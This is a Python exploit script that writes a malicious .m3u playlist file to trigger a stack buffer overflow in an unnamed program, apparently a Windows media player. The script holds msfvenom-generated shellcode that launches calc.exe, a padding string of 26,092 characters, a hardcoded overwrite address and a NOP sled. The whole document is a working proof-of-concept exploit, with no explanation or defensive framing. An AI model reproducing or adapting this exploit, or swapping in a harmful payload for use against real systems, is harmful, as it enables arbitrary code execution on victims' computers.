#!/usr/bin/python
'''
install the program -> run the script -> load the exploit.m3u into the program
'''


# shellcode: msfvenom -p windows/exec CMD=calc.exe -b "\x00\x09\x0A" -f python -v buf

buf =  ""
buf += "\xbd\xbb\x6d\x64\xfa\xd9\xc8\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x31\x31\x6a\x13\x83\xea\xfc\x03\x6a\xb4\x8f"
buf += "\x91\x06\x22\xcd\x5a\xf7\xb2\xb2\xd3\x12\x83\xf2\x80"
buf += "\x57\xb3\xc2\xc3\x3a\x3f\xa8\x86\xae\xb4\xdc\x0e\xc0"
buf += "\x7d\x6a\x69\xef\x7e\xc7\x49\x6e\xfc\x1a\x9e\x50\x3d"
buf += "\xd5\xd3\x91\x7a\x08\x19\xc3\xd3\x46\x8c\xf4\x50\x12"
buf += "\x0d\x7e\x2a\xb2\x15\x63\xfa\xb5\x34\x32\x71\xec\x96"
buf += "\xb4\x56\x84\x9e\xae\xbb\xa1\x69\x44\x0f\x5d\x68\x8c"
buf += "\x5e\x9e\xc7\xf1\x6f\x6d\x19\x35\x57\x8e\x6c\x4f\xa4"
buf += "\x33\x77\x94\xd7\xef\xf2\x0f\x7f\x7b\xa4\xeb\x7e\xa8"
buf += "\x33\x7f\x8c\x05\x37\x27\x90\x98\x94\x53\xac\x11\x1b"
buf += "\xb4\x25\x61\x38\x10\x6e\x31\x21\x01\xca\x94\x5e\x51"
buf += "\xb5\x49\xfb\x19\x5b\x9d\x76\x40\x31\x60\x04\xfe\x77"
buf += "\x62\x16\x01\x27\x0b\x27\x8a\xa8\x4c\xb8\x59\x8d\xa3"
buf += "\xf2\xc0\xa7\x2b\x5b\x91\xfa\x31\x5c\x4f\x38\x4c\xdf"
buf += "\x7a\xc0\xab\xff\x0e\xc5\xf0\x47\xe2\xb7\x69\x22\x04"
buf += "\x64\x89\x67\x67\xeb\x19\xeb\x46\x8e\x99\x8e\x96"

#Esp Addresse: 1001B058
filename="exploit.m3u"
buffer = "A"*26092
buffer += "\x58\xB0\x01\x10"
buffer += "\x90"*25
buffer += buf

textfile = open(filename,'w')
textfile.write(buffer)
textfile.close()